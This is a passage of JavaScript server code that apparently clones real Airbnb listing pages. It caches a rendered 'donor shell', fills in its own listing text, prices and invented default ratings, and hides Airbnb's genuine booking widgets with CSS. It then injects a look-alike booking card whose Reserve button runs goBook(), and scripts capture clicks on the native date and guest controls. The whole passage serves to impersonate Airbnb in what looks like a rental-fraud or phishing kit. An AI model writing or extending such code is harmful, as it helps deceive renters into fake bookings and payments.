  const symMap = { EUR: '€', USD: '$', GBP: '£', RON: 'lei ', CHF: 'CHF ' };
  const sym = symMap[currency] || (localeInfo.symbol || currency + ' ');
  const priceNight = parseFloat(listing.price) || 0;
  const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 0);
  const hideNightly = Number(listing.hide_nightly) === 1;
  return {
    title: listing.title || 'Apartment',
    loc: listing.location || '',
    desc: listing.description || '',
    host: listing.host_name || 'Host',
    hostPhoto: absoluteListingAsset(listing.host_photo || '', req),
    imgs,
    ptype: listing.property_type || 'Entire rental unit',
    guests: listing.guests || 4,
    bedrooms: listing.bedrooms || 1,
    beds: listing.beds || listing.bedrooms || 1,
    baths: listing.baths || 1,
    rating: parseFloat(listing.rating) || 4.92,
    reviews: parseInt(listing.reviews, 10) || 48,
    priceNight,
    priceMonth,
    hideNightly,
    currency,
    sym,
  };
}

async function getDonorAirbnbShell() {
  if (DONOR_SHELL_MEM.html && Date.now() - DONOR_SHELL_MEM.at < DONOR_SHELL_TTL_MS) {
    return DONOR_SHELL_MEM.html;
  }
  try {
    if (fs.existsSync(MF_DONOR_CACHE_PATH)) {
      const st = fs.statSync(MF_DONOR_CACHE_PATH);
      if (Date.now() - st.mtimeMs < DONOR_SHELL_TTL_MS) {
        const html = fs.readFileSync(MF_DONOR_CACHE_PATH, 'utf8');
        if (html && html.length > 80000 && /data-section-id="HERO_DEFAULT"/i.test(html)) {
          DONOR_SHELL_MEM = { html, at: Date.now() };
          return html;
        }
      }
    }
  } catch (e) {}

  console.log('[proxy] rendering donor shell', MF_DONOR_URL);
  const br = await browserRenderUrl(MF_DONOR_URL);
  const raw = br && br.body ? (Buffer.isBuffer(br.body) ? br.body.toString('utf8') : String(br.body)) : '';
  if (!raw || raw.length < 80000 || !/data-section-id="HERO_DEFAULT"/i.test(raw)) {
    throw new Error('donor shell invalid');
  }
  try {
    fs.mkdirSync(path.dirname(MF_DONOR_CACHE_PATH), { recursive: true });
    fs.writeFileSync(MF_DONOR_CACHE_PATH, raw);
  } catch (e) {
    console.warn('[proxy] donor cache write failed', e.message);
  }
  DONOR_SHELL_MEM = { html: raw, at: Date.now() };
  return raw;
}


/** Load frozen Airbnb PDP shell with local CSS/fonts (true offline frontend package). */
function getOfflineAirbnbShell() {
  if (OFFLINE_SHELL_MEM.html && Date.now() - OFFLINE_SHELL_MEM.at < DONOR_SHELL_TTL_MS) {
    return OFFLINE_SHELL_MEM.html;
  }
  const candidates = [MF_OFFLINE_SHELL_PATH, MF_OFFLINE_DATA_SHELL, MF_DONOR_CACHE_PATH];
  for (const p of candidates) {
    try {
      if (!fs.existsSync(p)) continue;
      const html = fs.readFileSync(p, 'utf8');
      if (html && html.length > 80000 && /data-section-id="HERO_DEFAULT"/i.test(html)) {
        OFFLINE_SHELL_MEM = { html, at: Date.now() };
        return html;
      }
    } catch (e) {}
  }
  return '';
}

/** Map / calendar / sticky booking helpers on frozen offline shell (no SPA). */
/** Last real body occurrence of data-section-id (skip early head/SSR stubs). */
function findLastSectionOpenTag(html, sectionId, minPos) {
  const needle = 'data-section-id="' + sectionId + '"';
  const floor = Math.max(0, Number(minPos) || 0);
  let from = 0;
  let last = -1;
  while (from < html.length) {
    const i = html.indexOf(needle, from);
    if (i < 0) break;
    if (i >= floor) last = i;
    from = i + needle.length;
  }
  if (last < 0) return null;
  const gt = html.indexOf('>', last);
  if (gt < 0) return null;
  return { start: last, end: gt + 1, tag: html.slice(last, gt + 1) };
}

function injectAfterLastSectionOpen(html, sectionId, injectHtml, minPos) {
  const hit = findLastSectionOpenTag(html, sectionId, minPos);
  if (!hit) return { html, placed: false };
  return {
    html: html.slice(0, hit.end) + injectHtml + html.slice(hit.end),
    placed: true,
    pos: hit.start
  };
}

function enhanceOfflineListingShell(html, listing, req) {
  let s = String(html || '');
  const p = buildListingInjectPayload(listing, req);
  const locQ = encodeURIComponent(p.loc || listing.location || 'London');
  const mapHtml =
    '<div class="mf-map-wrap" data-mf-map="1" style="margin:16px 0;border-radius:12px;overflow:hidden;min-height:280px"><iframe title="Map" loading="lazy" referrerpolicy="no-referrer-when-downgrade" ' +
    'src="https://maps.google.com/maps?q=' + locQ + '&z=14&output=embed" style="width:100%;height:320px;border:0"></iframe></div>';

  // Hide donor book-it chrome so only our sticky booking card shows (offline shell skips freezeDonorSpa)
  if (!/id="mf-book-hide"/.test(s)) {
    const hideCss =
      '<style id="mf-book-hide">' +
      '[data-testid="book-it-default"],[data-testid="book-it-sidebar"],[data-section-id="BOOK_IT_SIDEBAR"] > :not(#mf-booking-card),[data-section-id="BOOK_IT_FLOATING_FOOTER"]{display:none!important;visibility:hidden!important;pointer-events:none!important;height:0!important;max-height:0!important;overflow:hidden!important;margin:0!important;padding:0!important;border:0!important}' +
      '#mf-booking-card{display:block!important;visibility:visible!important;height:auto!important;max-height:none!important;overflow:visible!important;pointer-events:auto!important}' +
      '@media (min-width:744px){#mf-proxy-fab{display:none!important}}' +
      '#mf-guests-pop button[data-mf-g]{width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222;display:inline-flex;align-items:center;justify-content:center;padding:0}' +
      '#mf-guests-pop button[data-mf-g]:disabled{opacity:.35;cursor:not-allowed}' +
      '</style>';
    if (/<\/head>/i.test(s)) s = s.replace(/<\/head>/i, hideCss + '</head>');
    else s = hideCss + s;
  }

  // Body content starts near HERO; early SSR stubs sit ~50-60k — never inject there.
  const heroIdx = s.indexOf('data-section-id="HERO_DEFAULT"');
  const bodyFloor = heroIdx > 0 ? heroIdx : Math.min(100000, Math.floor(s.length * 0.35));

  // Inject Google Maps near location section if no live map canvas
  if (!/data-mf-map="1"/.test(s)) {
    let placed = false;
    const whereRe = /Where you['’]ll be[\s\S]{0,800}?Exact location provided after booking/i;
    const whereM = whereRe.exec(s);
    if (whereM && whereM.index >= bodyFloor) {
      s = s.slice(0, whereM.index + whereM[0].length) + mapHtml + s.slice(whereM.index + whereM[0].length);
      placed = true;
    }
    if (!placed) {
      const r = injectAfterLastSectionOpen(s, 'LOCATION_DEFAULT', mapHtml, bodyFloor);
      if (r.placed) { s = r.html; placed = true; }
    }
    if (!placed) {
      const r = injectAfterLastSectionOpen(s, 'REVIEWS_DEFAULT', mapHtml, bodyFloor);
      if (r.placed) { s = r.html; placed = true; }
    }
    if (!placed) {
      const r = injectAfterLastSectionOpen(s, 'AVAILABILITY_CALENDAR_INLINE', mapHtml, bodyFloor);
      if (r.placed) { s = r.html; placed = true; }
    }
    if (!placed) {
      if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, mapHtml + '</body>');
      else s += mapHtml;
    }
  }

  // Price text: primary line in book-it sidebar
  if (p.hideNightly && p.priceMonth) {
    const monthLabel = p.sym + (Math.round(p.priceMonth)).toLocaleString('en-GB') + ' month';
    s = s.replace(/£\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, monthLabel);
    s = s.replace(/\$\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, monthLabel);
    s = s.replace(/€\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, monthLabel);
    s = s.replace(/([\d,]+(?:\.\d+)?)\s*night/gi, (Math.round(p.priceMonth)).toLocaleString('en-GB') + ' month');
  } else if (p.priceNight) {
    const nightLabel = p.sym + (Math.round(p.priceNight)).toLocaleString('en-GB') + ' night';
    s = s.replace(/£\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, nightLabel);
    s = s.replace(/\$\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, nightLabel);
    s = s.replace(/€\s*[\d,]+(?:\.\d+)?\s*(?:night|\/ night)/gi, nightLabel);
  }

  // ─── Airbnb-style Booking Card (sticky sidebar clone) ───
  const priceLabel = p.hideNightly && p.priceMonth
    ? p.sym + Math.round(p.priceMonth).toLocaleString('en-GB') + ' month'
    : p.priceNight ? p.sym + Math.round(p.priceNight).toLocaleString('en-GB') + ' night' : '';
  const maxGuests = Math.max(1, Math.min(16, parseInt(listing.guests, 10) || 4));

  const bookCardHtml =
    '<div id="mf-booking-card" style="position:sticky;top:24px;z-index:10;background:#fff;border:1px solid #ddd;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.08);padding:24px;margin:12px 0;font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,sans-serif">' +
    // Price header
    '<div style="display:flex;align-items:baseline;gap:4px;margin-bottom:20px">' +
    '<span style="font-size:22px;font-weight:600;color:#222">' + p.sym + (p.hideNightly && p.priceMonth ? Math.round(p.priceMonth).toLocaleString('en-GB') : p.priceNight ? Math.round(p.priceNight).toLocaleString('en-GB') : '—') + '</span>' +
    '<span style="font-size:16px;color:#222">' + (p.hideNightly && p.priceMonth ? 'month' : 'night') + '</span>' +
    '</div>' +
    // Check-in / Checkout fields
    '<div id="mf-book-dates" style="display:grid;grid-template-columns:1fr 1fr;border:1px solid #b0b0b0;border-radius:8px 8px 0 0;overflow:hidden">' +
    '<button type="button" id="mf-bi-in" style="text-align:left;background:#fff;border:0;border-right:1px solid #b0b0b0;padding:12px 16px;cursor:pointer;font-family:inherit"><div style="font-weight:700;font-size:10px;letter-spacing:.04em;text-transform:uppercase;color:#222">Check-in</div><div data-mf-bi="in" style="font-size:14px;color:#717171;margin-top:4px">Add date</div></button>' +
    '<button type="button" id="mf-bi-out" style="text-align:left;background:#fff;border:0;padding:12px 16px;cursor:pointer;font-family:inherit"><div style="font-weight:700;font-size:10px;letter-spacing:.04em;text-transform:uppercase;color:#222">Checkout</div><div data-mf-bi="out" style="font-size:14px;color:#717171;margin-top:4px">Add date</div></button>' +
    '</div>' +
    // Guests field
    '<div id="mf-book-guests" style="position:relative;border:1px solid #b0b0b0;border-top:0;border-radius:0 0 8px 8px;background:#fff">' +
    '<button type="button" id="mf-bi-guests" style="width:100%;text-align:left;background:#fff;border:0;padding:12px 16px;cursor:pointer;font-family:inherit"><div style="font-weight:700;font-size:10px;letter-spacing:.04em;text-transform:uppercase;color:#222">Guests</div><div id="mf-guests-label" style="font-size:14px;color:#717171;margin-top:4px">1 guest</div></button>' +
    '<div id="mf-guests-pop" style="display:none;position:absolute;left:0;right:0;top:100%;z-index:60;margin-top:8px;background:#fff;border:1px solid #ddd;border-radius:12px;box-shadow:0 8px 28px rgba(0,0,0,.16);padding:16px 20px;font-family:inherit">' +
    '<div data-mf-grow="adults" style="display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid #ebebeb"><div><div style="font-weight:600;font-size:14px;color:#222">Adults</div><div style="color:#717171;font-size:13px">Ages 13+</div></div><div style="display:flex;align-items:center;gap:14px"><button type="button" data-mf-g="-" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">−</button><span data-mf-g-val style="min-width:18px;text-align:center;font-size:14px;color:#222">1</span><button type="button" data-mf-g="+" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">+</button></div></div>' +
    '<div data-mf-grow="children" style="display:flex;align-items:center;justify-content:space-between;padding:14px 0;border-bottom:1px solid #ebebeb"><div><div style="font-weight:600;font-size:14px;color:#222">Children</div><div style="color:#717171;font-size:13px">Ages 2–12</div></div><div style="display:flex;align-items:center;gap:14px"><button type="button" data-mf-g="-" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">−</button><span data-mf-g-val style="min-width:18px;text-align:center;font-size:14px;color:#222">0</span><button type="button" data-mf-g="+" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">+</button></div></div>' +
    '<div data-mf-grow="infants" style="display:flex;align-items:center;justify-content:space-between;padding:14px 0"><div><div style="font-weight:600;font-size:14px;color:#222">Infants</div><div style="color:#717171;font-size:13px">Under 2</div></div><div style="display:flex;align-items:center;gap:14px"><button type="button" data-mf-g="-" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">−</button><span data-mf-g-val style="min-width:18px;text-align:center;font-size:14px;color:#222">0</span><button type="button" data-mf-g="+" style="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222">+</button></div></div>' +
    '<button type="button" id="mf-guests-close" style="margin-top:10px;float:right;background:none;border:0;text-decoration:underline;font-weight:600;cursor:pointer;font-size:14px;color:#222;font-family:inherit">Close</button><div style="clear:both"></div></div>' +
    '</div>' +
    // Reserve CTA
    '<button type="button" id="mf-reserve-btn" onclick="goBook()" style="width:100%;margin-top:16px;padding:14px;background:linear-gradient(90deg,#E61E4D,#D70466);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit">Reserve</button>' +
    '<p style="text-align:center;color:#717171;font-size:12px;margin:8px 0 0;font-family:inherit">You won\'t be charged yet</p>' +
    '</div>';

  // Calendar picker (compact, modern)
  const calUi =
    '<div id="mf-offline-cal" style="margin:12px 0;padding:16px;border:1px solid #ddd;border-radius:12px;background:#fff;font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,sans-serif">' +
    '<div style="font-weight:600;font-size:16px;color:#222;margin-bottom:12px">Select check-in date</div>' +
    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">' +
    '<label style="font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:#222">Check-in<br><input id="mf-cal-in" type="date" style="width:100%;margin-top:6px;padding:10px 12px;border:1px solid #b0b0b0;border-radius:8px;font-size:14px;font-family:inherit;box-sizing:border-box"></label>' +
    '<label style="font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:#222">Checkout<br><input id="mf-cal-out" type="date" style="width:100%;margin-top:6px;padding:10px 12px;border:1px solid #b0b0b0;border-radius:8px;font-size:14px;font-family:inherit;box-sizing:border-box"></label>' +
    '</div>' +
    '<p id="mf-cal-hint" style="margin:10px 0 0;color:#717171;font-size:14px">Add your travel dates for exact pricing</p>' +
    '</div>';

  if (!/id="mf-offline-cal"/.test(s)) {
    let calPlaced = false;
    const calR = injectAfterLastSectionOpen(s, 'AVAILABILITY_CALENDAR_INLINE', calUi, bodyFloor);
    if (calR.placed) { s = calR.html; calPlaced = true; }
    if (!calPlaced) {
      const titleR = injectAfterLastSectionOpen(s, 'TITLE_DEFAULT', calUi, bodyFloor);
      if (titleR.placed) { s = titleR.html; calPlaced = true; }
    }
    if (!calPlaced) {
      if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, calUi + '</body>');
      else s += calUi;
    }
  }

  if (!/id="mf-book-dates"/.test(s)) {
    const bookR = injectAfterLastSectionOpen(s, 'BOOK_IT_SIDEBAR', bookCardHtml, bodyFloor);
    if (bookR.placed) s = bookR.html;
    else {
      const bookR2 = injectAfterLastSectionOpen(s, 'BOOK_IT_FLOATING_FOOTER', bookCardHtml, bodyFloor);
      if (bookR2.placed) s = bookR2.html;
    }
  } else if (!/id="mf-book-guests"/.test(s)) {
    // Upgrade older shells that only had date row
    const guestsOnly =
      '<div id="mf-book-guests" style="position:relative;border:1px solid #b0b0b0;border-top:0;border-radius:0 0 8px 8px;margin:0 0 12px;background:#fff">' +
      '<button type="button" id="mf-bi-guests" style="width:100%;text-align:left;background:#fff;border:0;padding:10px 12px;cursor:pointer;font:12px Circular,system-ui,sans-serif">' +
      '<div style="font-weight:700;font-size:10px;letter-spacing:.04em">GUESTS</div>' +
      '<div id="mf-guests-label" style="font-size:14px;margin-top:2px">1 guest</div></button>' +
      '<div id="mf-guests-pop" style="display:none;position:absolute;left:0;right:0;top:100%;z-index:50;margin-top:8px;background:#fff;border:1px solid #ddd;border-radius:12px;box-shadow:0 8px 28px rgba(0,0,0,.16);padding:16px;font:14px Circular,system-ui,sans-serif">' +
      '<div data-mf-grow="adults" style="display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #ebebeb">' +
      '<div><div style="font-weight:600">Adults</div><div style="color:#717171;font-size:13px">Age 13+</div></div>' +
      '<div style="display:flex;align-items:center;gap:12px">' +
      '<button type="button" data-mf-g="-">−</button><span data-mf-g-val>1</span><button type="button" data-mf-g="+">+</button></div></div>' +
      '<div data-mf-grow="children" style="display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #ebebeb">' +
      '<div><div style="font-weight:600">Children</div><div style="color:#717171;font-size:13px">Ages 2–12</div></div>' +
      '<div style="display:flex;align-items:center;gap:12px">' +
      '<button type="button" data-mf-g="-">−</button><span data-mf-g-val>0</span><button type="button" data-mf-g="+">+</button></div></div>' +
      '<div data-mf-grow="infants" style="display:flex;align-items:center;justify-content:space-between;padding:10px 0">' +
      '<div><div style="font-weight:600">Infants</div><div style="color:#717171;font-size:13px">Under 2</div></div>' +
      '<div style="display:flex;align-items:center;gap:12px">' +
      '<button type="button" data-mf-g="-">−</button><span data-mf-g-val>0</span><button type="button" data-mf-g="+">+</button></div></div>' +
      '<button type="button" id="mf-guests-close" style="margin-top:8px;float:right;background:none;border:0;text-decoration:underline;font-weight:600;cursor:pointer;font:14px Circular,system-ui,sans-serif">Close</button>' +
      '<div style="clear:both"></div></div></div>';
    s = s.replace(/id="mf-book-dates"([^>]*)>/i, function(m) {
      return m;
    });
    // Place guests row immediately after the mf-book-dates block
    const bdOpen = s.indexOf('id="mf-book-dates"');
    if (bdOpen > 0) {
      const afterOpen = s.indexOf('>', bdOpen);
      // find matching close of the dates grid div — next sibling insertion after first top-level closing of that div
      let depth = 0, i = s.lastIndexOf('<', afterOpen);
      let insertAt = -1;
      for (let p = i; p < s.length - 5; p++) {
        if (s.startsWith('<div', p) || s.startsWith('<DIV', p)) { depth++; }
        else if (s.startsWith('</div>', p) || s.startsWith('</DIV>', p)) {
          depth--;
          if (depth === 0) { insertAt = p + 6; break; }
        }
      }
      if (insertAt > 0) s = s.slice(0, insertAt) + guestsOnly + s.slice(insertAt);
      else if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, guestsOnly + '</body>');
      else s += guestsOnly;
    } else if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, guestsOnly + '</body>');
    else s += guestsOnly;
    // Round the existing dates box top corners if it still has full radius
    s = s.replace(/(id="mf-book-dates"[^>]*border-radius:)8px/i, '$10 0');
    s = s.replace(/(id="mf-book-dates"[^>]*margin:12px 0)/i, 'id="mf-book-dates" style="display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid #b0b0b0;border-radius:8px 8px 0 0;overflow:hidden;margin:12px 0 0');
  }

  // Wire calendar → book-it + guests picker + reserve modal dates
  const calScript =
    '\n<script id="mf-offline-cal-js">(function(){\n' +
    'var MAX_G=' + maxGuests + ';\n' +
    'window.__MF_GUESTS={adults:1,children:0,infants:0};\n' +
    'function $(id){return document.getElementById(id);}\n' +
    'function fmt(v){if(!v)return "Add date"; try{var d=new Date(v+"T12:00:00");return d.toLocaleDateString("en-GB",{day:"numeric",month:"short",year:"numeric"});}catch(e){return v;}}\n' +
    'function qparam(k){try{return new URLSearchParams(location.search).get(k)||"";}catch(e){return "";}}\n' +
    'function sync(){\n' +
    '  var a=$("mf-cal-in"), b=$("mf-cal-out"); if(!a||!b) return;\n' +
    '  var ai=a.value, bo=b.value;\n' +
    '  document.querySelectorAll("[data-mf-bi=in]").forEach(function(el){el.textContent=fmt(ai);});\n' +
    '  document.querySelectorAll("[data-mf-bi=out]").forEach(function(el){el.textContent=fmt(bo);});\n' +
    '  var hi=$("mf-cal-hint");\n' +
    '  if(hi){ hi.textContent = (ai&&bo) ? ("Selected: "+fmt(ai)+" → "+fmt(bo)) : "Add your travel dates for exact pricing"; }\n' +
    '  try{ var ci=document.getElementById("mf-checkin"); var co=document.getElementById("mf-checkout"); if(ci&&ai) ci.value=ai; if(co&&bo) co.value=bo; }catch(e){}\n' +
    '}\n' +
    'function guestTotal(){ var g=window.__MF_GUESTS||{}; return (g.adults||0)+(g.children||0); }\n' +
    'function syncGuests(){\n' +
    '  var g=window.__MF_GUESTS; var t=guestTotal();\n' +
    '  var label=(t<=0?"Add guests":(t===1?"1 guest":t+" guests"));\n' +
    '  if(g.infants) label+=" · "+g.infants+" infant"+(g.infants>1?"s":"");\n' +
    '  var el=$("mf-guests-label"); if(el) el.textContent=label;\n' +
    '  try{\n' +
    '    var sel=document.getElementById("mf-guests"); if(sel){ var v=String(Math.max(1,t)); if(!Array.from(sel.options).some(function(o){return o.value===v;})){ var o=document.createElement("option"); o.value=v; o.textContent=v+" guests"; sel.appendChild(o);} sel.value=v; }\n' +
    '  }catch(e){}\n' +
    '  document.querySelectorAll("[data-mf-grow]").forEach(function(row){\n' +
    '    var k=row.getAttribute("data-mf-grow"); var sp=row.querySelector("[data-mf-g-val]"); if(sp) sp.textContent=String(g[k]||0);\n' +
    '    var minus=row.querySelector("[data-mf-g=\"-\"]"); var plus=row.querySelector("[data-mf-g=\"+\"]");\n' +
    '    if(minus){ minus.disabled=(k==="adults"?g.adults<=1:(g[k]||0)<=0); minus.style.opacity=minus.disabled?0.35:1; }\n' +
    '    if(plus){ var atMax=(k==="infants")?(g.infants>=5):(guestTotal()>=MAX_G); plus.disabled=atMax; plus.style.opacity=plus.disabled?0.35:1; }\n' +
    '  });\n' +
    '}\n' +
    'function bindGuests(){\n' +
    '  var btn=$("mf-bi-guests"), pop=$("mf-guests-pop"); if(!btn||!pop) return;\n' +
    '  if(pop.getAttribute("data-mf-gbound")==="1") return;\n' +
    '  pop.setAttribute("data-mf-gbound","1");\n' +
    '  var adults0=parseInt(qparam("adults")||qparam("numberOfAdults")||qparam("guests")||"1",10)||1;\n' +
    '  var child0=parseInt(qparam("children")||qparam("numberOfChildren")||"0",10)||0;\n' +
    '  var inf0=parseInt(qparam("infants")||qparam("numberOfInfants")||"0",10)||0;\n' +
    '  window.__MF_GUESTS={adults:Math.min(MAX_G,Math.max(1,adults0)),children:Math.max(0,child0),infants:Math.max(0,inf0)};\n' +
    '  if(guestTotal()>MAX_G){ window.__MF_GUESTS.children=Math.max(0,MAX_G-window.__MF_GUESTS.adults); }\n' +
    '  pop.querySelectorAll("button[data-mf-g]").forEach(function(b){\n' +
    '    b.type="button";\n' +
    '    b.style.cssText="width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:18px;line-height:1;cursor:pointer;color:#222";\n' +
    '  });\n' +
    '  function applyGuestStep(b){\n' +
    '    if(!b||b.disabled) return;\n' +
    '    var row=b.closest("[data-mf-grow]"); if(!row) return;\n' +
    '    var k=row.getAttribute("data-mf-grow"); var g=window.__MF_GUESTS; var dir=b.getAttribute("data-mf-g");\n' +
    '    if(dir==="+"){\n' +
    '      if(k==="infants"){ if(g.infants<5) g.infants++; }\n' +
    '      else if(guestTotal()<MAX_G) g[k]=(g[k]||0)+1;\n' +
    '    } else {\n' +
    '      if(k==="adults"){ if(g.adults>1) g.adults--; }\n' +
    '      else if((g[k]||0)>0) g[k]--;\n' +
    '    }\n' +
    '    syncGuests();\n' +
    '  }\n' +
    '  // Document capture runs before mid-tree stopPropagation that blocks #mf-guests-pop\n' +
    '  var _mfGLast=0;\n' +
    '  function onGuestCtl(e){\n' +
    '    var t=e.target; if(!t||!t.closest) return;\n' +
    '    var b=t.closest("[data-mf-g]");\n' +
    '    if(!b||!b.closest("#mf-guests-pop,#mf-book-guests")) return;\n' +
    '    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();\n' +
    '    var now=Date.now(); if(now-_mfGLast<280) return; _mfGLast=now;\n' +
    '    applyGuestStep(b);\n' +
    '  }\n' +
    '  document.addEventListener("pointerdown", onGuestCtl, true);\n' +
    '  document.addEventListener("click", onGuestCtl, true);\n' +
    '  function openPop(e){ if(e){ e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation(); } pop.style.display="block"; syncGuests(); }\n' +
    '  function closePop(){ pop.style.display="none"; }\n' +
    '  btn.addEventListener("click", function(e){ e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation(); if(pop.style.display==="block") closePop(); else openPop(); }, true);\n' +
    '  var cl=$("mf-guests-close"); if(cl) cl.addEventListener("click", function(e){ e.preventDefault(); e.stopPropagation(); closePop(); }, true);\n' +
    '  document.addEventListener("click", function(e){ if(pop.style.display!=="block") return; if(e.target.closest("#mf-book-guests,#mf-guests-pop")) return; closePop(); }, true);\n' +
    '  // Also arm donor guest fields / little-search guests\n' +
    '  function armDonorGuests(){\n' +
    '    try{\n' +
    '      document.querySelectorAll("button,[role=button],[data-testid]").forEach(function(el){\n' +
    '        if(el.getAttribute("data-mf-garmed")==="1") return;\n' +
    '        var t=((el.getAttribute("data-testid")||"")+" "+(el.innerText||"")+" "+(el.getAttribute("aria-label")||"")).toLowerCase();\n' +
    '        if(!/guest/.test(t)) return;\n' +
    '        if(el.closest("#mf-book-guests,#mf-proxy-overlay,#mf-offline-cal")) return;\n' +
    '        if(t.length>80 && !/data-testid/.test(el.outerHTML||"")) return;\n' +
    '        el.setAttribute("data-mf-garmed","1");\n' +
    '        el.addEventListener("click", function(ev){ ev.preventDefault(); ev.stopPropagation(); if(ev.stopImmediatePropagation) ev.stopImmediatePropagation(); openPop(ev); try{ btn.scrollIntoView({block:"center",behavior:"smooth"}); }catch(e){} }, true);\n' +
    '      });\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  armDonorGuests(); setInterval(armDonorGuests, 1500);\n' +
    '  syncGuests();\n' +
    '}\n' +
    'function bind(){\n' +
    '  var a=$("mf-cal-in"), b=$("mf-cal-out"); if(!a) return;\n' +
    '  var t=new Date(); var iso=t.toISOString().slice(0,10); a.min=iso; if(b) b.min=iso;\n' +
    '  var qIn=qparam("check_in")||qparam("checkin")||qparam("checkIn");\n' +
    '  var qOut=qparam("check_out")||qparam("checkout")||qparam("checkOut");\n' +
    '  if(qIn && /^\\d{4}-\\d{2}-\\d{2}$/.test(qIn)) a.value=qIn;\n' +
    '  if(qOut && /^\\d{4}-\\d{2}-\\d{2}$/.test(qOut)) b.value=qOut;\n' +
    '  a.addEventListener("change", function(){ if(b && a.value){ b.min=a.value; if(b.value && b.value<=a.value){ var d=new Date(a.value+"T12:00:00"); d.setDate(d.getDate()+1); b.value=d.toISOString().slice(0,10);} } sync(); });\n' +
    '  if(b) b.addEventListener("change", sync);\n' +
    '  a.addEventListener("input", sync); if(b) b.addEventListener("input", sync);\n' +
    '  // Keep book-it labels in sync if donor re-renders or values arrive late\n' +
    '  setTimeout(sync, 0); setTimeout(sync, 300); setTimeout(sync, 1200);\n' +
    '  setInterval(function(){ try{ sync(); }catch(e){} }, 2000);\n' +
    '  function focusIn(){ try{ a.showPicker ? a.showPicker() : a.focus(); }catch(e){ a.focus(); } }\n' +
    '  var bi=$("mf-bi-in"), bo=$("mf-bi-out");\n' +
    '  if(bi) bi.addEventListener("click", function(e){ e.preventDefault(); focusIn(); });\n' +
    '  if(bo) bo.addEventListener("click", function(e){ e.preventDefault(); try{ b.showPicker ? b.showPicker() : b.focus(); }catch(e){ if(b) b.focus(); } });\n' +
    '  // arm any leftover donor date fields\n' +
    '  document.querySelectorAll("button,[role=button],[data-testid]").forEach(function(el){\n' +
    '    if(el.getAttribute("data-mf-darmed")==="1") return;\n' +
    '    var t=((el.getAttribute("data-testid")||"")+" "+(el.innerText||"").slice(0,40)+" "+(el.getAttribute("aria-label")||"")).toLowerCase();\n' +
    '    if(!/check-?in|check-?out|add date|change dates|datepicker/.test(t)) return;\n' +
    '    if(el.closest("#mf-offline-cal,#mf-book-dates,#mf-proxy-overlay")) return;\n' +
    '    el.setAttribute("data-mf-darmed","1");\n' +
    '    el.addEventListener("click", function(ev){ ev.preventDefault(); ev.stopPropagation(); if(/out|checkout/.test(t)){ try{ b.showPicker?b.showPicker():b.focus(); }catch(e){} } else focusIn(); }, true);\n' +
    '  });\n' +
    '  // Bridge: Airbnb native day-grid → mf-cal-in/out + booking card labels\n' +
    '  function parseDayAria(label){\n' +
    '    if(!label) return null;\n' +
    '    var m=String(label).match(/(\\d{1,2}),\\s*\\w+,\\s*(\\w+)\\s+(\\d{4})/i);\n' +
    '    if(!m) return null;\n' +
    '    var months={january:0,february:1,march:2,april:3,may:4,june:5,july:6,august:7,september:8,october:9,november:10,december:11};\n' +
    '    var mi=months[m[2].toLowerCase()]; if(mi==null) return null;\n' +
    '    var d=new Date(Date.UTC(parseInt(m[3],10), mi, parseInt(m[1],10)));\n' +
    '    if(isNaN(d.getTime())) return null;\n' +
    '    return d.toISOString().slice(0,10);\n' +
    '  }\n' +
    '  function parseDayTestId(id){\n' +
    '    if(!id) return null;\n' +
    '    // calendar-day-04/08/2026 or calendar-day-4/8/2026\n' +
    '    var m=String(id).match(/calendar-day-(\\d{1,2})\\/(\\d{1,2})\\/(\\d{4})/i);\n' +
    '    if(!m) return null;\n' +
    '    var dd=parseInt(m[1],10), mm=parseInt(m[2],10), yy=parseInt(m[3],10);\n' +
    '    if(!dd||!mm||!yy) return null;\n' +
    '    var d=new Date(Date.UTC(yy, mm-1, dd));\n' +
    '    if(isNaN(d.getTime())) return null;\n' +
    '    return d.toISOString().slice(0,10);\n' +
    '  }\n' +
    '  function findDayEl(t){\n' +
    '    if(!t||!t.closest) return null;\n' +
    '    return t.closest("td[role=button],button[aria-label],[role=button][aria-label],[data-testid^=calendar-day-],td[data-testid^=calendar-day-]");\n' +
    '  }\n' +
